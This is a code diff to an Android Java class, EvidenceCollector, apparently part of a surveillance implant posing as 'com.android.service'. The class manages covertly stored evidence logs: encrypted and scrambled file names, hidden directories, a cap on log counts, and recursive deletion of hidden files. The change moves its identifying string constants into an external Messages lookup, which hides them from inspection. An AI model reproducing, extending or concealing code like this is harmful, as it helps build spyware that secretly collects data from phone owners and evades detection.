@@ -20,6 +20,7 @@ import java.util.Vector;
 
 import android.content.Context;
 
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.crypto.Encryption;
@@ -35,15 +36,15 @@ import com.android.service.util.Utils;
  */
 public class EvidenceCollector {
 	/** The debug. */
-	private static final String TAG = "EvidenceColl";
+	private static final String TAG = "EvidenceColl"; //$NON-NLS-1$
 	/** The Constant LOG_EXTENSION. */
-	public static final String LOG_EXTENSION = ".mob";
+	public static final String LOG_EXTENSION = Messages.getString("EvidenceCollector.0"); //$NON-NLS-1$
 
 	/** The Constant LOG_DIR_PREFIX. */
-	public static final String LOG_DIR_PREFIX = "Z"; // Utilizzato per creare le
+	public static final String LOG_DIR_PREFIX = Messages.getString("EvidenceCollector.1"); // Utilizzato per creare le //$NON-NLS-1$
 	// Log Dir
 	/** The Constant LOG_DIR_FORMAT. */
-	public static final String LOG_DIR_FORMAT = "Z*"; // Utilizzato nella
+	public static final String LOG_DIR_FORMAT = Messages.getString("EvidenceCollector.2"); // Utilizzato nella //$NON-NLS-1$
 	// ricerca delle Log Dir
 	/** The Constant LOG_PER_DIRECTORY. */
 	public static final int LOG_PER_DIRECTORY = 500; // Numero massimo di log
@@ -52,8 +53,8 @@ public class EvidenceCollector {
 	public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che
 
 	/** The Constant PROG_FILENAME. */
-	private static final String PROG_FILENAME = "pr_80";
-	public static final String LOG_TMP = ".dat";
+	private static final String PROG_FILENAME = Messages.getString("EvidenceCollector.3"); //$NON-NLS-1$
+	public static final String LOG_TMP = Messages.getString("EvidenceCollector.4"); //$NON-NLS-1$
 
 	/** The seed. */
 	int seed;
@@ -134,7 +135,7 @@ public class EvidenceCollector {
 	 */
 	public synchronized void removeProgressive() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: Removing Progressive");
+			Check.log(TAG + " Info: Removing Progressive") ;//$NON-NLS-1$
 		}
 		final Context content = Status.getAppContext();
 		content.deleteFile(PROG_FILENAME);
@@ -158,7 +159,7 @@ public class EvidenceCollector {
 			fos.close();
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString());
+				Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
 			}
 		}
 
@@ -182,7 +183,7 @@ public class EvidenceCollector {
 			fos.close();
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString());
+				Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
 			}
 		}
 
@@ -220,28 +221,28 @@ public class EvidenceCollector {
 		final Date timestamp = log.timestamp;
 		final int progressive = getNewProgressive();
 		if (Cfg.DEBUG) {
-			Check.asserts(progressive >= 0, "makeNewName fail progressive >=0");
+			Check.asserts(progressive >= 0, "makeNewName fail progressive >=0"); //$NON-NLS-1$
 		}
 		final Vector vector = new Vector();
 		final String basePath = Path.logs();
 
-		final String blockDir = "l_" + (progressive / LOG_PER_DIRECTORY);
+		final String blockDir = Messages.getString("EvidenceCollector.5") + (progressive / LOG_PER_DIRECTORY); //$NON-NLS-1$
 
 		// http://www.rgagnon.com/javadetails/java-0021.html
-		final String mask = "0000";
+		final String mask = Messages.getString("EvidenceCollector.6"); //$NON-NLS-1$
 		final String ds = Long.toString(progressive % 10000); // double to
 		// string
 		final int size = mask.length() - ds.length();
 		if (Cfg.DEBUG) {
-			Check.asserts(size >= 0, "makeNewName: failed size>0");
+			Check.asserts(size >= 0, "makeNewName: failed size>0"); //$NON-NLS-1$
 		}
 		final String paddedProgressive = mask.substring(0, size) + ds;
 
-		final String fileName = paddedProgressive + "" + logType + "" + makeDateName(timestamp);
+		final String fileName = paddedProgressive + "" + logType + "" + makeDateName(timestamp); //$NON-NLS-1$ //$NON-NLS-2$
 
 		final String encName = encryptName(fileName + LOG_EXTENSION);
 		if (Cfg.DEBUG) {
-			Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName + " ch: " + seed + " not scrambled: "
+			Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName + " ch: " + seed + " not scrambled: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 					+ fileName + LOG_EXTENSION);
 		}
 
@@ -262,13 +263,13 @@ public class EvidenceCollector {
 	 *            the log name
 	 */
 	public void remove(final String logName) {
-		// if(AutoConfig.DEBUG) Check.log( TAG + " Removing file: " + logName);
+		// if(AutoConfig.DEBUG) Check.log( TAG + " Removing file: " + logName) ;//$NON-NLS-1$
 		final AutoFile file = new AutoFile(logName);
 		if (file.exists()) {
 			file.delete();
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Warn: " + "File doesn't exists: " + logName);
+				Check.log(TAG + " Warn: " + "File doesn't exists: " + logName) ;//$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
 	}
@@ -282,7 +283,7 @@ public class EvidenceCollector {
 	 */
 	public synchronized int removeHidden() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (removeHidden)");
+			Check.log(TAG + " (removeHidden)") ;//$NON-NLS-1$
 		}
 		final int removed = removeRecursive(new File(Path.hidden()), Integer.MAX_VALUE);
 		return removed;
@@ -306,7 +307,7 @@ public class EvidenceCollector {
 
 			if (basePath.isDirectory()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (removeRecursive): " + basePath.getName());
+					Check.log(TAG + " (removeRecursive): " + basePath.getName()) ;//$NON-NLS-1$
 				}
 				final File[] fileLogs = basePath.listFiles();
 
@@ -318,7 +319,7 @@ public class EvidenceCollector {
 
 			if (!basePath.delete()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (removeRecursive) Error: " + basePath.getAbsolutePath());
+					Check.log(TAG + " (removeRecursive) Error: " + basePath.getAbsolutePath()) ;//$NON-NLS-1$
 				}
 			} else {
 				numLogsDeleted += 1;
@@ -326,11 +327,11 @@ public class EvidenceCollector {
 
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: removeLog: " + basePath + " ex: " + e);
+				Check.log(TAG + " Error: removeLog: " + basePath + " ex: " + e) ;//$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " removeLogRecursive removed: " + numLogsDeleted);
+			Check.log(TAG + " removeLogRecursive removed: " + numLogsDeleted) ;//$NON-NLS-1$
 		}
 		return numLogsDeleted;
 
@@ -345,7 +346,7 @@ public class EvidenceCollector {
 	 */
 	public Vector scanForDirLogs(final String currentPath) {
 		if (Cfg.DEBUG) {
-			Check.requires(currentPath != null, "null argument");
+			Check.requires(currentPath != null, "null argument"); //$NON-NLS-1$
 		}
 		File fc;
 
@@ -360,9 +361,9 @@ public class EvidenceCollector {
 					final File fdir = new File(currentPath + dir);
 					if (fdir.isDirectory()) {
 
-						vector.addElement(dir + "/");
+						vector.addElement(dir + "/"); //$NON-NLS-1$
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " scanForDirLogs adding: " + dir);
+							Check.log(TAG + " scanForDirLogs adding: " + dir) ;//$NON-NLS-1$
 						}
 					}
 				}
@@ -371,11 +372,11 @@ public class EvidenceCollector {
 
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: scanForDirLogs: " + e);
+				Check.log(TAG + " Error: scanForDirLogs: " + e) ;//$NON-NLS-1$
 			}
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " scanForDirLogs #: " + vector.size());
+			Check.log(TAG + " scanForDirLogs #: " + vector.size()) ;//$NON-NLS-1$
 		}
 		return vector;
 	}
@@ -393,10 +394,10 @@ public class EvidenceCollector {
 	 */
 	public String[] scanForEvidences(final String currentPath, final String dir) {
 		if (Cfg.DEBUG) {
-			Check.requires(currentPath != null, "null argument");
+			Check.requires(currentPath != null, "null argument"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(!currentPath.startsWith("file://"), "currentPath shouldn't start with file:// : "
+			Check.requires(!currentPath.startsWith("file://"), "currentPath shouldn't start with file:// : " //$NON-NLS-1$ //$NON-NLS-2$
 					+ currentPath);
 		}
 
@@ -422,11 +423,11 @@ public class EvidenceCollector {
 					map.put(plainName, file);
 				} else if (file.endsWith(EvidenceCollector.LOG_TMP)) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " ignoring temp file: " + file);
+						Check.log(TAG + " ignoring temp file: " + file) ;//$NON-NLS-1$
 					}
 				} else {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " Info: wrong name, deleting: " + fcDir + "/" + file);
+						Check.log(TAG + " Info: wrong name, deleting: " + fcDir + "/" + file) ;//$NON-NLS-1$ //$NON-NLS-2$
 					}
 					final File toDelete = new File(fcDir, file);
 					toDelete.delete();
@@ -435,13 +436,13 @@ public class EvidenceCollector {
 
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: scanForLogs: " + e);
+				Check.log(TAG + " Error: scanForLogs: " + e) ;//$NON-NLS-1$
 			}
 		} finally {
 
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " scanForLogs numDirs: " + map.size());
+			Check.log(TAG + " scanForLogs numDirs: " + map.size()) ;//$NON-NLS-1$
 		}
 		final ArrayList<String> val = new ArrayList<String>(map.values());
 		// Collections.reverse(val);
